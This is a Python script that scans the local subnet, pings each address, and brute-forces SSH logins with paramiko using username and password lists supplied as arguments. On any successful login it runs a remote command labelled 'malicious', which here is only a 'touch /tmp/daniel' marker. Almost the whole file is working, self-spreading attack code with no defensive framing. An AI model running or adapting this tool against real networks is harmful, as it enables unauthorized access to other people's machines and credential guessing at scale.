import paramiko
import subprocess
import sys
from time import sleep
from netaddr import IPNetwork


def connect(ip, usernames, passwords):
    print("Attacking: {}".format(ip))

    for user in usernames:
        for pwd in passwords:
            connected = False
            while True:
                try:
                    print('Trying: username={}, password={}'.format(user, pwd))
                    ssh.connect(ip, username=user, password=pwd)
                    execute(ssh)
                    connected = True
                    break
                except paramiko.AuthenticationException:
                    print('Failed!')
                    break
                except (EOFError, paramiko.ssh_exception.SSHException):
                    print('Failed to connect!')
                    sleep(0.2)
                    continue
            if connected:
                print('Success!')
                return


def scan(usernames, passwords):
    print('Started scanning')
    res = str(subprocess.check_output(['ip', 'addr']))
    hostIp = ([x for x in [x for x in res.split('\\n') if 'inet' in x and 'inet6' not in x][-1].split(' ') if '.' in x][0])
    for ip in IPNetwork(hostIp):
        ipStr = str(ip)
        lastOctet = ipStr.split('.')[-1]
        if lastOctet in ('0', '1', '255', hostIp.split('.')[-1][:-3]):
            continue
        print('Scanning: {}'.format(ipStr))
        child = subprocess.Popen(["/bin/ping", "-c1", "-w10", ipStr], stdout=subprocess.PIPE)
        child.communicate()[0]
        ping_response = child.returncode
        if ping_response == 0:
            connect(ipStr, usernames, passwords)


def execute(ssh):
    print('Executing malicious commands')
    ssh.exec_command('touch /tmp/daniel')


if __name__ == "__main__":
    usernames = []
    passwords = []

    with open(sys.argv[1], 'r') as u, open(sys.argv[2], 'r') as p:
        passwords = [x.strip() for x in p.readlines()]
        usernames = [x.strip() for x in u.readlines()]

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    scan(usernames, passwords)
    ssh.close()
